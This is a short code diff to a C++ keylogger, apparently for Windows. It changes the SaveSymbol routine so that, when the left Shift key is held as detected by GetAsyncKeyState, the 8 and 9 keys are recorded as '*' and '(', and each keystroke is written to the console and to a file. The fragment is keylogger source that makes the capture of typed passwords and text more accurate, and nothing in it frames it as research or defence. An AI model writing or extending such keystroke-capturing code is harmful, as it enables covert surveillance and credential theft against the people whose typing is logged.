@@ -118,13 +118,29 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 56:
-			std::cout << "8";
-			WriteToFile("8");
+			if (GetAsyncKeyState(0xA0))
+			{
+				std::cout << "*";
+				WriteToFile("*");
+			}
+			else
+			{
+				std::cout << "8";
+				WriteToFile("8");
+			}
 			break;
 
 		case 57:
-			std::cout << "9";
-			WriteToFile("9");
+			if (GetAsyncKeyState(0xA0))
+			{
+				std::cout << "(";
+				WriteToFile("(");
+			}
+			else
+			{
+				std::cout << "9";
+				WriteToFile("9");
+			}
 			break;
 
 
